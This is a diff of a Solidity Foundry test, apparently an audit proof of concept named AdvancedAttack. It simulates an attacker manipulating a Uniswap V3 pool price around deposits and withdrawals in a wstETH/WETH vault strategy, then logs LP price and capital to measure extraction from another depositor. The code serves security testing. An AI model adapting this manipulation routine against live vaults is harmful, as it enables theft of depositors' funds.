@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.9;
 
-import "../lib/forge-std/src/console2.sol";
 import "./helpers/libraries/LiquidityAmounts.sol";
 import "./helpers/libraries/TickMath.sol";
 import "./helpers/libraries/FullMath.sol";
@@ -35,7 +34,6 @@ import "./FeedContract.sol";
 import "../src/UniV3VaultSpot.sol";
 import "../src/UniV3VaultSpotGovernance.sol";
 
-
 contract AdvancedAttack is Test {
     address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     address public wsteth = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
@@ -54,7 +52,9 @@ contract AdvancedAttack is Test {
     address public router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
     address public mockOracleAddress;
     address public stethContractAddress = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
-    
+    address public attacker = 0x341C245124CCDCe62655a29207acBee0f6e3135a;
+    address public depositor = 0xC6576F7F84E75B89DB0ad847d796760ba8Fda5f9;
+
     address rootVault;
     LStrategy lstrategy;
 
@@ -62,17 +62,19 @@ contract AdvancedAttack is Test {
 
     function setupUniGovernance() public {
         UniV3VaultSpot spotVault = new UniV3VaultSpot();
-        IVaultGovernance.InternalParams memory params_ = IVaultGovernance.InternalParams(IProtocolGovernance(governance), IVaultRegistry(registry), IVault(spotVault));
-        IUniV3VaultGovernance.DelayedProtocolParams memory protocolParams_ = IUniV3VaultGovernance(uniGovernanceOld).delayedProtocolParams();
+        IVaultGovernance.InternalParams memory params_ = IVaultGovernance.InternalParams(
+            IProtocolGovernance(governance),
+            IVaultRegistry(registry),
+            IVault(spotVault)
+        );
+        IUniV3VaultGovernance.DelayedProtocolParams memory protocolParams_ = IUniV3VaultGovernance(uniGovernanceOld)
+            .delayedProtocolParams();
         uniGovernance = address(new UniV3VaultSpotGovernance(params_, protocolParams_));
         vm.startPrank(admin);
         uint8[] memory permissions = new uint8[](2);
         permissions[0] = PermissionIdsLibrary.CREATE_VAULT;
         permissions[1] = PermissionIdsLibrary.REGISTER_VAULT;
-        IProtocolGovernance(governance).stagePermissionGrants(
-            uniGovernance,
-            permissions
-        );
+        IProtocolGovernance(governance).stagePermissionGrants(uniGovernance, permissions);
         vm.warp(block.timestamp + IProtocolGovernance(governance).governanceDelay());
         IProtocolGovernance(governance).commitPermissionGrants(uniGovernance);
         vm.stopPrank();
@@ -112,13 +114,13 @@ contract AdvancedAttack is Test {
 
         vm.stopPrank();
 
-        mint(weth, deployer, 10 ** 10);
-        mint(wsteth, deployer, 10 ** 10);
-        IERC20(weth).approve(rootVault, 10 ** 10);
-        IERC20(wsteth).approve(rootVault, 10 ** 10);
+        mint(weth, deployer, 10**10);
+        mint(wsteth, deployer, 10**10);
+        IERC20(weth).approve(rootVault, 10**10);
+        IERC20(wsteth).approve(rootVault, 10**10);
         uint256[] memory toDeposit = new uint256[](2);
-        toDeposit[0] = 10 ** 10;
-        toDeposit[1] = 10 ** 10;
+        toDeposit[0] = 10**10;
+        toDeposit[1] = 10**10;
         w.deposit(toDeposit, 0, "");
     }
 
@@ -127,6 +129,10 @@ contract AdvancedAttack is Test {
         IERC20 steth = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
 
         wethContract.approve(address(curvePool), type(uint256).max);
+        steth.approve(address(wstethContract), type(uint256).max);
+        vm.prank(attacker);
+        steth.approve(address(wstethContract), type(uint256).max);
+        vm.prank(depositor);
         steth.approve(address(wstethContract), type(uint256).max);
         wethContract.withdraw(2 * 10**21);
 
@@ -185,19 +191,30 @@ contract AdvancedAttack is Test {
         return lowerVault.pool();
     }
 
-    function getCapital(uint256 amount0, uint256 amount1, int24 currentTick) internal pure returns (uint256 capital) {
-        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(currentTick);
-        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 2 ** 96);
+    function getCapital(
+        uint256 amount0,
+        uint256 amount1,
+        int24 realTick
+    ) internal pure returns (uint256 capital) {
+        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(realTick);
+        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 2**96);
         // TODO: check order
-        return FullMath.mulDiv(amount0, priceX96, 2 ** 96) + amount1;
+        return FullMath.mulDiv(amount0, priceX96, 2**96) + amount1;
     }
 
-    function buildInitialPositions(
-        uint256 width,
-        uint256 weth_amount,
-        uint256 wsteth_amount,
-        uint256 startNft
-    ) public {
+    function getTotalCapital(int24 realTick) internal view returns (uint256 capital) {
+        (uint256[] memory minTvl, uint256[] memory maxTvl) = IERC20RootVault(rootVault).tvl();
+        require(minTvl[0] == maxTvl[0] && minTvl[1] == maxTvl[1], "Invariant on tvl is wrong");
+        return getCapital(minTvl[0], minTvl[1], realTick);
+    }
+
+    function getLpPriceD18(int24 realTick) internal view returns (uint256 priceD18) {
+        uint256 capital = getTotalCapital(realTick);
+        uint256 supply = IERC20RootVault(rootVault).totalSupply();
+        return FullMath.mulDiv(capital, 10**18, supply);
+    }
+
+    function buildInitialPositions(uint256 width, uint256 startNft) public {
         int24 tick = getUniV3Tick();
         changePrice(tick);
 
@@ -216,9 +233,9 @@ contract AdvancedAttack is Test {
 
         {
             uint256[] memory nfts = new uint256[](3);
-            nfts[0] = startNft + 2;
-            nfts[1] = startNft;
-            nfts[2] = startNft + 1;
+            nfts[0] = startNft;
+            nfts[1] = startNft + 1;
+            nfts[2] = startNft + 2;
 
             address[] memory tokens = new address[](2);
             tokens[0] = wsteth;
@@ -226,61 +243,6 @@ contract AdvancedAttack is Test {
 
             combineVaults(tokens, nfts);
         }
-
-        IERC20Vault erc20 = lstrategy.erc20Vault();
-        while (IERC20(weth).balanceOf(deployer) < 10**18 * (weth_amount + 10)) {
-            mint(weth, deployer, 10**21);
-        }
-
-        IWETH(weth).transfer(address(erc20), 10**18 * weth_amount);
-
-        ISTETH stethContract = ISTETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
-        IWSTETH wstethContract = IWSTETH(wsteth);
-
-        while (wstethContract.balanceOf(deployer) < 10**18 * (wsteth_amount + 10)) {
-            mint(weth, deployer, 10**21);
-            IWETH(weth).withdraw(10**21);
-            stethContract.submit{value: 10**21}(deployer);
-            wstethContract.wrap(10**21);
-        }
-
-        IWSTETH(wsteth).transfer(address(erc20), 10**18 * wsteth_amount);
-    }
-
-    function tvl(
-        int24 leftTick,
-        int24 rightTick,
-        int24 currentTick,
-        uint128 liquidity
-    ) internal pure returns (uint256 amount0, uint256 amount1) {
-        (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
-            TickMath.getSqrtRatioAtTick(currentTick),
-            TickMath.getSqrtRatioAtTick(leftTick),
-            TickMath.getSqrtRatioAtTick(rightTick),
-            liquidity
-        );
-    }
-
-    function getCapitalAtCurrentTick(
-        int24 leftLowerTick,
-        int24 leftUpperTick,
-        int24 rightLowerTick,
-        int24 rightUpperTick,
-        int24 currentTick,
-        uint128 liquidityLower,
-        uint128 liquidityUpper
-    ) internal pure returns (uint256 capital) {
-        uint256 capitalLeft;
-        {
-            (uint256 amount0, uint256 amount1) = tvl(leftLowerTick, leftUpperTick, currentTick, liquidityLower);
-            capitalLeft = getCapital(amount0, amount1, currentTick);
-        }
-        uint256 capitalRight;
-        {
-            (uint256 amount0, uint256 amount1) = tvl(rightLowerTick, rightUpperTick, currentTick, liquidityUpper);
-            capitalRight = getCapital(amount0, amount1, currentTick);
-        }
-        return capitalRight + capitalLeft;
     }
 
     function mint(
@@ -288,6 +250,11 @@ contract AdvancedAttack is Test {
         address addr,
         uint256 amount
     ) public {
+        if (addr == attacker) {
+            console2.log("ATTACKER MINT:");
+            console2.log(token);
+            console2.log(amount);
+        }
         uint256 currentBalance = IERC20(token).balanceOf(addr);
         deal(token, addr, currentBalance + amount);
     }
@@ -304,14 +271,8 @@ contract AdvancedAttack is Test {
         wethContract.approve(address(curvePool), type(uint256).max);
         steth.approve(address(wstethContract), type(uint256).max);
 
-        console2.log("Before withdrawal");
-        console2.log("Balance: ", wethContract.balanceOf(deployer));
-        console2.log("Small amount: ", smallAmount);
-        console2.log("Weth balance: ", address(wethContract).balance);
         wethContract.withdraw(smallAmount / 2);
-        console2.log("Before exchange");
         curvePool.exchange{value: smallAmount / 2}(0, 1, smallAmount / 2, 0);
-        console2.log("After exchange");
         wstethContract.wrap(((smallAmount / 2) * 99) / 100);
     }
 
@@ -327,14 +288,81 @@ contract AdvancedAttack is Test {
         MockOracle(mockOracleAddress).updatePrice(priceX96);
     }
 
+    function makeDesiredPoolPrice(int24 tick, address changer) public {
+        IUniswapV3Pool pool = getPool();
+        uint256 startTry = 10**16 * 10000;
+
+        uint256 needIncrease = 0;
+
+        while (true) {
+            (, int24 currentPoolTick, , , , , ) = pool.slot0();
+            if (currentPoolTick == tick) {
+                break;
+            }
+
+            if (currentPoolTick < tick) {
+                if (needIncrease == 0) {
+                    needIncrease = 1;
+                    startTry = startTry / 2;
+                }
+                swapTokens(changer, changer, weth, wsteth, startTry);
+            } else {
+                if (needIncrease == 1) {
+                    needIncrease = 0;
+                    startTry = startTry / 2;
+                }
+                swapTokens(changer, changer, wsteth, weth, startTry);
+            }
+        }
+    }
+
+    function swapTokens(
+        address sender,
+        address recepient,
+        address tokenIn,
+        address tokenOut,
+        uint256 amountIn
+    ) public {
+        uint256 balance = IERC20(tokenIn).balanceOf(sender);
+        if (tokenIn == weth) {
+            mintWeth(sender, amountIn);
+        } else {
+            mintWsteth(sender, amountIn);
+        }
+
+        vm.startPrank(sender);
+
+        IERC20(tokenIn).approve(router, type(uint256).max);
+
+        ISwapRouter(router).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: tokenIn,
+                tokenOut: tokenOut,
+                fee: 500,
+                recipient: recepient,
+                deadline: type(uint256).max,
+                amountIn: amountIn,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        vm.stopPrank();
+    }
+
+    function fullPriceUpdate(int24 tick, address changer) public {
+        makeDesiredPoolPrice(tick, changer);
+        changePrice(tick);
+    }
+
     function preparePush(
         IUniV3Vault vault,
         int24 tickLower,
         int24 tickUpper
     ) public {
-        vm.startPrank(admin);
-        IVaultRegistry(registry).approve(deployer, vault.nft());
-        vm.stopPrank();
+        uint256 vaultNft = vault.nft();
+        vm.prank(admin);
+        IVaultRegistry(registry).approve(deployer, vaultNft);
 
         (uint256 nft, , , ) = INonfungiblePositionManager(uniswapV3PositionManager).mint(
             INonfungiblePositionManager.MintParams({
@@ -378,6 +406,13 @@ contract AdvancedAttack is Test {
         IProtocolGovernance protocolGovernance = IProtocolGovernance(governance);
 
         {
+            IProtocolGovernance.Params memory params = protocolGovernance.params();
+            params.withdrawLimit = type(uint256).max / 10**18;
+            vm.prank(admin);
+            IProtocolGovernance(governance).stageParams(params);
+        }
+
+        {
             uint8[] memory args = new uint8[](1);
             args[0] = PermissionIdsLibrary.ERC20_VAULT_TOKEN;
             vm.prank(admin);
@@ -385,10 +420,10 @@ contract AdvancedAttack is Test {
         }
 
         vm.warp(block.timestamp + protocolGovernance.governanceDelay());
-        vm.prank(admin);
+        vm.startPrank(admin);
         protocolGovernance.commitPermissionGrants(wsteth);
-
-        console2.log("Commited grants");
+        protocolGovernance.commitParams();
+        vm.stopPrank();
 
         address[] memory tokens = new address[](2);
         tokens[0] = wsteth;
@@ -396,30 +431,27 @@ contract AdvancedAttack is Test {
 
         IVaultRegistry vaultRegistry = IVaultRegistry(registry);
 
-        uint256 uniV3LowerVaultNft = vaultRegistry.vaultsCount() + 1;
+        uint256 erc20Nft = vaultRegistry.vaultsCount() + 1;
 
         vm.startPrank(admin);
 
         {
-            IUniV3VaultGovernance uniV3VaultGovernance = IUniV3VaultGovernance(uniGovernance);
-            console2.log("Before create");
-            uniV3VaultGovernance.createVault(tokens, admin, uint24(uniV3PoolFee), helper);
-            uniV3VaultGovernance.createVault(tokens, admin, uint24(uniV3PoolFee), helper);
-            console2.log("After create");
+            IERC20VaultGovernance erc20VaultGovernance = IERC20VaultGovernance(erc20Governance);
+            erc20VaultGovernance.createVault(tokens, admin);
         }
 
         {
-            IERC20VaultGovernance erc20VaultGovernance = IERC20VaultGovernance(erc20Governance);
-            erc20VaultGovernance.createVault(tokens, admin);
-            IVaultGovernance.InternalParams memory kek = erc20VaultGovernance.internalParams();
+            IUniV3VaultGovernance uniV3VaultGovernance = IUniV3VaultGovernance(uniGovernance);
+            uniV3VaultGovernance.createVault(tokens, admin, uint24(uniV3PoolFee), helper);
+            uniV3VaultGovernance.createVault(tokens, admin, uint24(uniV3PoolFee), helper);
         }
 
         vm.stopPrank();
 
         MockCowswap mockCowswap = new MockCowswap();
-        IERC20Vault erc20Vault = IERC20Vault(vaultRegistry.vaultForNft(uniV3LowerVaultNft + 2));
-        IUniV3Vault uniV3LowerVault = IUniV3Vault(vaultRegistry.vaultForNft(uniV3LowerVaultNft));
-        IUniV3Vault uniV3UpperVault = IUniV3Vault(vaultRegistry.vaultForNft(uniV3LowerVaultNft + 1));
+        IERC20Vault erc20Vault = IERC20Vault(vaultRegistry.vaultForNft(erc20Nft));
+        IUniV3Vault uniV3LowerVault = IUniV3Vault(vaultRegistry.vaultForNft(erc20Nft + 1));
+        IUniV3Vault uniV3UpperVault = IUniV3Vault(vaultRegistry.vaultForNft(erc20Nft + 2));
 
         lstrategy = new LStrategy(
             positionManager,
@@ -449,7 +481,97 @@ contract AdvancedAttack is Test {
         mint(weth, deployer, 4 * 10**21);
 
         setupSecondPhase(wethContract, wstethContract);
-        return uniV3LowerVaultNft;
+        return erc20Nft;
+    }
+
+    function mintWeth(address sender, uint256 targetValue) public {
+        uint256 balance = IERC20(weth).balanceOf(sender);
+        while (balance < targetValue) {
+            mint(weth, sender, 3000 * (10**18));
+            balance = IERC20(weth).balanceOf(sender);
+        }
+    }
+
+    function reportCapital(address addr, int24 tick) internal view {
+        console2.log("CAPITAL:");
+        if (addr == depositor) {
+            console2.log("DEPOSITOR");
+        }
+        if (addr == attacker) {
+            console2.log("ATTACKER");
+        }
+        console2.log(getCapital(IERC20(wsteth).balanceOf(addr), IERC20(weth).balanceOf(addr), tick));
+    }
+
+    function mintWsteth(address sender, uint256 targetValue) public {
+        if (sender != deployer) {
+            vm.startPrank(sender);
+        }
+        ISTETH stethContract = ISTETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
+        uint256 balance = IERC20(wsteth).balanceOf(sender);
+        while (balance < targetValue) {
+            uint256 toMint = 3000 * (10**18);
+            mint(weth, sender, toMint);
+            if (toMint > IERC20(weth).balanceOf(sender)) {
+                toMint = IERC20(weth).balanceOf(sender);
+            }
+            // if (toMint > weth.balance) {
+            //     toMint = weth.balance;
+            // }
+            IWETH(weth).withdraw(toMint);
+            stethContract.submit{value: toMint}(sender);
+            uint256 stethBalance = stethContract.balanceOf(sender);
+            if (stethBalance < toMint) {
+                IWSTETH(wsteth).wrap(stethBalance);
+            } else {
+                IWSTETH(wsteth).wrap(toMint);
+            }
+            balance = IERC20(wsteth).balanceOf(sender);
+        }
+        if (sender != deployer) {
+            vm.stopPrank();
+        }
+    }
+
+    function swapOnCowswap(int24 tick) public {
+        vm.startPrank(admin);
+        lstrategy.postPreOrder(0);
+        vm.stopPrank();
+
+        (address preOrderTokenIn, , , uint256 preOrderAmountIn, uint256 preOrderMinAmountOut) = lstrategy.preOrder();
+        if (preOrderAmountIn == 0) {
+            return;
+        }
+        uint256 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
+        uint256 priceX96 = FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, 1 << 96);
+        address tokenOut;
+        uint256 amountOut;
+        if (preOrderTokenIn == weth) {
+            amountOut = FullMath.mulDiv(preOrderAmountIn, 1 << 96, priceX96);
+            tokenOut = wsteth;
+        } else {
+            amountOut = FullMath.mulDiv(preOrderAmountIn, priceX96, 1 << 96);
+            tokenOut = weth;
+        }
+        vm.startPrank(address(lstrategy.erc20Vault()));
+        IERC20(preOrderTokenIn).transfer(deployer, preOrderAmountIn);
+        vm.stopPrank();
+        IERC20(tokenOut).transfer(address(lstrategy.erc20Vault()), amountOut);
+    }
+
+    function fullRebalance(int24 tick) internal {
+        uint256[] memory arr = new uint256[](2);
+        for (int24 i = 0; i < 12; ++i) {
+            vm.prank(admin);
+            lstrategy.rebalanceUniV3Vaults(arr, arr, type(uint256).max);
+        }
+        for (int24 i = 0; i < 5; ++i) {
+            vm.startPrank(admin);
+            lstrategy.rebalanceERC20UniV3Vaults(arr, arr, type(uint256).max);
+            lstrategy.rebalanceUniV3Vaults(arr, arr, type(uint256).max);
+            vm.stopPrank();
+            swapOnCowswap(tick);
+        }
     }
 
     function execute(
@@ -457,18 +579,80 @@ contract AdvancedAttack is Test {
         int24 initialTick,
         int24 shiftedTick
     ) public {
-        
+        fullPriceUpdate(rebalanceTick, deployer);
+        fullRebalance(rebalanceTick);
+        uint256[] memory tokenAmounts = new uint256[](2);
+        tokenAmounts[0] = 10000 * (10**18);
+        tokenAmounts[1] = 10000 * (10**18);
+        makeDeposit(tokenAmounts, depositor);
+        fullPriceUpdate(initialTick, deployer);
+        reportCapital(attacker, initialTick);
+        console2.log("INITIAL PRICE: ", getLpPriceD18(initialTick));
+        makeDeposit(tokenAmounts, attacker);
+        fullPriceUpdate(shiftedTick, attacker);
+        withdrawAll(attacker);
+        fullPriceUpdate(initialTick, attacker);
+        console2.log("FINAL PRICE: ", getLpPriceD18(initialTick));
+        withdrawAll(depositor);
+        reportCapital(attacker, initialTick);
+    }
+
+    function makeDeposit(uint256[] memory tokenAmounts, address from) public {
+        mintWeth(from, tokenAmounts[1]);
+        mintWsteth(from, tokenAmounts[0]);
+        vm.startPrank(from);
+        IERC20(weth).approve(rootVault, tokenAmounts[1]);
+        IERC20(wsteth).approve(rootVault, tokenAmounts[0]);
+        IERC20RootVault(rootVault).deposit(tokenAmounts, 0, "");
+        vm.stopPrank();
+    }
+
+    function withdrawAll(address from) public {
+        uint256 balance = IERC20RootVault(rootVault).balanceOf(from);
+        uint256[] memory tokenAmounts = new uint256[](2);
+        bytes[] memory options = new bytes[](3);
+        vm.prank(from);
+        IERC20RootVault(rootVault).withdraw(from, balance, tokenAmounts, options);
+    }
+
+    function mintMockPosition() public {
+        INonfungiblePositionManager positionManager = INonfungiblePositionManager(uniswapV3PositionManager);
+        positionManager.mint(
+            INonfungiblePositionManager.MintParams({
+                token0: wsteth,
+                token1: weth,
+                fee: 500,
+                tickLower: -10000,
+                tickUpper: 10000,
+                amount0Desired: 5 * 10**20,
+                amount1Desired: 5 * 10**20,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: deployer,
+                deadline: type(uint256).max
+            })
+        );
     }
 
     function test() public {
         address stethGovernance = 0x2e59A20f205bB85a89C53f1936454680651E618e;
 
-        vm.startPrank(stethGovernance);
+        vm.prank(stethGovernance);
         ISTETH(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84).removeStakingLimit();
-        vm.stopPrank();
 
         uint256 nft = setup();
+        mintMockPosition();
+        buildInitialPositions(vm.envUint("width"), nft);
 
-
+        int24 deviation = int24(vm.envInt("deviation"));
+        int24 shift = int24(vm.envInt("shift"));
+        for (int24 initialTick = 0; initialTick * 2 <= vm.envInt("width"); initialTick += 10) {
+            for (int24 shift = -int24(vm.envInt("width")) * 2; shift <= vm.envInt("width") * 2; shift += 5) {
+                console2.log("NEW ROUND");
+                console2.log("INITIAL TICK:", uint24(initialTick));
+                execute(initialTick + deviation, initialTick, initialTick + shift);
+                vm.warp(block.timestamp + 12);
+            }
+        }
     }
 }
